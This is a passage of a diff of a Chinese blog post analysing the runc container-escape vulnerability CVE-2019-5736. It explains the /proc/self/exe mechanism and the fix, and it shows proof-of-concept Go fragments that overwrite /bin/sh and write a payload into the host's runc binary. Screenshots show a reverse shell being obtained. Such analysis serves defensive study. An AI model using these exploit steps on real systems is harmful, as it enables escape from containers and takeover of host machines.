-<h2 id="2-CVE-2019-5736"><a href="#2-CVE-2019-5736" class="headerlink" title="2. CVE-2019-5736"></a>2. CVE-2019-5736</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1) 漏洞原理"></a>1) 漏洞原理</h3><p>结合对源代码的简要分析,简而言之,<code>runc run或者runc exec</code>的过程可以分为如下几步:</p>
+<h2 id="cve-2019-5736">2. CVE-2019-5736</h2>
+<h3 id="漏洞原理">1) 漏洞原理</h3>
+<p>结合对源代码的简要分析,简而言之,<code>runc run或者runc exec</code>的过程可以分为如下几步:</p>
 <p>runc会创建一个<code>runc init</code>的子进程,创建的关键细节如下:</p>
 <pre class="line-numbers language-go" data-language="go"><code class="language-go">cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">)</span>
 cmd<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
@@ -864,7 +884,6 @@ cmd<span class="token punctuation">.</span>Stdin <span class="token operator">=<
 cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> p<span class="token punctuation">.</span>Stdout
 cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> p<span class="token punctuation">.</span>Stderr
 cmd<span class="token punctuation">.</span>Dir <span class="token operator">=</span> c<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Rootfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>也就是说<code>runc init</code>子进程是通过<code>/proc/self/exec</code>为蓝本,在加额外的一个命令行参数<code>init</code>创建的一个子进程.</p>
 <blockquote>
 <p><strong>/proc伪文件系统</strong></p>
@@ -872,23 +891,24 @@ cmd<span class="token punctuation">.</span>Dir <span class="token operator">=</s
 <p><strong>/proc/self/exe</strong></p>
 <p>我们可以通过/proc/[pid]/exc获取到该进程对应的二进制文件.相对于一般的符号链接,有一些不同.内核不会像其他的符号连接一样通过解析文件路径的方式去检索该文件,而是有专门的处理函数处理并直接返回其文件描述符.<strong>可以跨越mount_namespaces带来的限制</strong>.</p>
 </blockquote>
-<p>通过上面知识的补充,我们可以知道,即使runc init再后来会进行mount_namespaces的隔离设置,但借助<code>/proc/self/exe</code>仍然可以绕过这些限制,获取到runc对应的二进制文件.</p>
+<p>通过上面知识的补充,我们可以知道,即使runc
+init再后来会进行mount_namespaces的隔离设置,但借助<code>/proc/self/exe</code>仍然可以绕过这些限制,获取到runc对应的二进制文件.</p>
 <p>此外,<code>runc init</code>最终会落实到下面的命令:</p>
 <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword keyword-if">if</span> err <span class="token operator">:=</span> system<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> l<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token function">Environ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
     <span class="token keyword keyword-return">return</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"can't exec user process: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
 <span class="token punctuation">}</span>
 <span class="token keyword keyword-return">return</span> <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>最终仅仅是调用了<code>system.Exec</code>,对<code>runc init</code>进程的内容进行替换.</p>
-<p>总的来说runc的过程就如图(图片引用自<a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/">zyleo’s Blog</a>)所示:</p>
-<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2013%2046%2010%201668577570%201668577570984%20vWKz9Q%20image-20221116134610837%20.png" alt="image-20221116134610837" style="zoom:50%;">
-
+<p>总的来说runc的过程就如图(图片引用自<a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/">zyleo's Blog</a>)所示:</p>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2013%2046%2010%201668577570%201668577570984%20vWKz9Q%20image-20221116134610837%20.png" alt="image-20221116134610837" style="zoom:50%;"></p>
 <p>因此,如果能使得<code>system.Exec</code>执行的仍然是<code>/proc/self/exe</code>,然后在该容器中就可以从/proc伪文件系统下检索到“/proc/self/exe”对应的进程,然后就可以通过/proc获取到runc程序对应的文件句柄,执行修改操作,修改成我们想要运行的恶意程序,当runc在此被运行时,就会运行我们构造的恶意程序,达成攻击效果.</p>
 <blockquote>
 <p><strong>为什么非得在容器中运行一个runc程序,而非在execve中直接获取/proc/self/exe并进行修改呢?</strong></p>
 <p>这一点我比较疑惑.</p>
 </blockquote>
-<h3 id="2-poc程序分析"><a href="#2-poc程序分析" class="headerlink" title="2) poc程序分析"></a>2) poc程序分析</h3><h4 id="1-重写-x2F-bin-x2F-sh"><a href="#1-重写-x2F-bin-x2F-sh" class="headerlink" title="(1) 重写/bin/sh"></a>(1) 重写/bin/sh</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>
+<h3 id="poc程序分析">2) poc程序分析</h3>
+<h4 id="重写binsh">(1) 重写/bin/sh</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>
 fd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
 <span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
@@ -900,9 +920,9 @@ err <span class="token operator">=</span> fd<span class="token punctuation">.</s
     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
     <span class="token keyword keyword-return">return</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>此时,我们已经处于容器之中,以上做的是将“/bin/sh”二进制文件的内容重写成“#!/proc/self/exe”.修改之后,运行“/bin/sh”时就会运行“/proc/self/exe”对应的二进制文件.此操作的目的在于,我们需要在该容器内在运行出一个<code>runc</code>进程,一旦用户执行<code>docker(runc) exec ... /bin/sh</code>,就会在容器里运行一个runc进程.</p>
-<h4 id="2-轮询-x2F-proc找到runc进程"><a href="#2-轮询-x2F-proc找到runc进程" class="headerlink" title="(2) 轮询/proc找到runc进程"></a>(2) 轮询/proc找到runc进程</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword keyword-var">var</span> found <span class="token builtin">int</span>
+<h4 id="轮询proc找到runc进程">(2) 轮询/proc找到runc进程</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword keyword-var">var</span> found <span class="token builtin">int</span>
 <span class="token keyword keyword-for">for</span> found <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
     pids<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadDir</span><span class="token punctuation">(</span><span class="token string">"/proc"</span><span class="token punctuation">)</span>
     <span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
@@ -922,13 +942,14 @@ err <span class="token operator">=</span> fd<span class="token punctuation">.</s
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这一段代码的目的在于,轮询/proc,当知道cmdline前缀有“runc”的为止.</p>
 <blockquote>
 <p><strong>/proc/[pid]/cmdline</strong></p>
 <p>表示的是该进程的命令行参数,相当于argv的内容.</p>
 </blockquote>
-<h4 id="3-获取-x2F-proc-x2F-pid-x2F-exe对应的文件句柄并修改"><a href="#3-获取-x2F-proc-x2F-pid-x2F-exe对应的文件句柄并修改" class="headerlink" title="(3) 获取/proc/[pid]/exe对应的文件句柄并修改"></a>(3) 获取/proc/[pid]/exe对应的文件句柄并修改</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go">    <span class="token comment">// We will use the pid to get a file handle for runc on the host.</span>
+<h4 id="获取procpidexe对应的文件句柄并修改">(3)
+获取/proc/[pid]/exe对应的文件句柄并修改</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">    <span class="token comment">// We will use the pid to get a file handle for runc on the host.</span>
     <span class="token keyword keyword-var">var</span> handleFd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
     <span class="token keyword keyword-for">for</span> handleFd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{</span>
         <span class="token comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>
@@ -950,31 +971,72 @@ err <span class="token operator">=</span> fd<span class="token punctuation">.</s
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>打开<code>/proc/[pid]/exe</code>,返回其文件描述符,然后将payload的内容写到该文件里的,也就完成了对runc程序的修改,之后在运行runc程序,就会出发payload.</p>
-<h3 id="3-复现过程"><a href="#3-复现过程" class="headerlink" title="3) 复现过程"></a>3) 复现过程</h3><p>(1) 首先运行一个容器.</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2053%2021%201668588801%201668588801496%20xujZrf%20image-20221116165321361%20.png" alt="image-20221116165321361"></p>
-<p>(2) 然后将main.go(poc)程序编译好之后拷贝到容器中</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2054%2011%201668588851%201668588851269%20REQ25Y%20image-20221116165411177%20.png" alt="image-20221116165411177"></p>
-<p>(3) 攻击方监听某个端口准备就绪.</p>
-<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2040%2045%201668588045%201668588045279%20fIBSgS%20image-20221116164045188%20.png" alt="image-20221116164045188" style="zoom: 67%;">
-
-<p>(4) 运行poc程序</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2055%2004%201668588904%201668588904187%20aE71Lk%20image-20221116165504096%20.png" alt="image-20221116165504096"></p>
-<p>(5) 等待exec /bin/sh的执行</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2057%2055%201668589075%201668589075403%20pxPe7f%20image-20221116165755304%20.png" alt="image-20221116165755304"></p>
-<p>(6) 反弹shell建立</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2058%2033%201668589113%201668589113794%20lTCGwk%20image-20221116165833693%20.png" alt="image-20221116165833693"></p>
+<h3 id="复现过程">3) 复现过程</h3>
+<ol type="1">
+<li>首先运行一个容器.</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2053%2021%201668588801%201668588801496%20xujZrf%20image-20221116165321361%20.png" alt="image-20221116165321361">
+<figcaption aria-hidden="true">image-20221116165321361</figcaption>
+</figure>
+<ol start="2" type="1">
+<li>然后将main.go(poc)程序编译好之后拷贝到容器中</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2054%2011%201668588851%201668588851269%20REQ25Y%20image-20221116165411177%20.png" alt="image-20221116165411177">
+<figcaption aria-hidden="true">image-20221116165411177</figcaption>
+</figure>
+<ol start="3" type="1">
+<li>攻击方监听某个端口准备就绪.</li>
+</ol>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2040%2045%201668588045%201668588045279%20fIBSgS%20image-20221116164045188%20.png" alt="image-20221116164045188" style="zoom: 67%;"></p>
+<ol start="4" type="1">
+<li>运行poc程序</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2055%2004%201668588904%201668588904187%20aE71Lk%20image-20221116165504096%20.png" alt="image-20221116165504096">
+<figcaption aria-hidden="true">image-20221116165504096</figcaption>
+</figure>
+<ol start="5" type="1">
+<li>等待exec /bin/sh的执行</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2057%2055%201668589075%201668589075403%20pxPe7f%20image-20221116165755304%20.png" alt="image-20221116165755304">
+<figcaption aria-hidden="true">image-20221116165755304</figcaption>
+</figure>
+<ol start="6" type="1">
+<li>反弹shell建立</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2058%2033%201668589113%201668589113794%20lTCGwk%20image-20221116165833693%20.png" alt="image-20221116165833693">
+<figcaption aria-hidden="true">image-20221116165833693</figcaption>
+</figure>
 <p>攻击方执行一些命令:</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2018%201668588438%201668588438952%20rSRtD8%20image-20221116164718848%20.png" alt="image-20221116164718848"></p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2035%201668588455%201668588455527%20iAx2ok%20image-20221116164735411%20.png" alt="image-20221116164735411"></p>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2018%201668588438%201668588438952%20rSRtD8%20image-20221116164718848%20.png" alt="image-20221116164718848">
+<figcaption aria-hidden="true">image-20221116164718848</figcaption>
+</figure>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2035%201668588455%201668588455527%20iAx2ok%20image-20221116164735411%20.png" alt="image-20221116164735411">
+<figcaption aria-hidden="true">image-20221116164735411</figcaption>
+</figure>
 <p>攻击成功.</p>
-<h3 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4) 漏洞修复"></a>4) 漏洞修复</h3><p>其修补方式在于当<code>runc init</code>进程进入到容器命名空间之前,首先将<code>/proc/self/exe</code>复制到内存中,使得当前<code>/proc/self/exe</code>所指向的文件句柄是复制的匿名文件,而非宿主机上的runc文件.</p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2014%201668591974%201668591974298%20gcopKo%20image-20221116174614170%20.png" alt="image-20221116174614170"></p>
-<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2040%201668592000%201668592000839%20pVRkcI%20image-20221116174640734%20.png" alt="image-20221116174640734"></p>
+<h3 id="漏洞修复">4) 漏洞修复</h3>
+<p>其修补方式在于当<code>runc init</code>进程进入到容器命名空间之前,首先将<code>/proc/self/exe</code>复制到内存中,使得当前<code>/proc/self/exe</code>所指向的文件句柄是复制的匿名文件,而非宿主机上的runc文件.</p>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2014%201668591974%201668591974298%20gcopKo%20image-20221116174614170%20.png" alt="image-20221116174614170">
+<figcaption aria-hidden="true">image-20221116174614170</figcaption>
+</figure>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2040%201668592000%201668592000839%20pVRkcI%20image-20221116174640734%20.png" alt="image-20221116174640734">
+<figcaption aria-hidden="true">image-20221116174640734</figcaption>
+</figure>
 <p>这样即使使用同样的方式进行攻击,也不会对宿主机上的runc程序产生任何影响.</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UZ7VdGSUGSvoo-6GVl53qg">容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#runc%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E7%9A%84%E8%BF%87%E7%A8%8B">Docker runc(CVE-2019-5736)漏洞分析-第三版</a></p>
+<h2 id="reference">Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UZ7VdGSUGSvoo-6GVl53qg">容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#runc%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E7%9A%84%E8%BF%87%E7%A8%8B">Docker
+runc(CVE-2019-5736)漏洞分析-第三版</a></p>
 
                 
             </div>
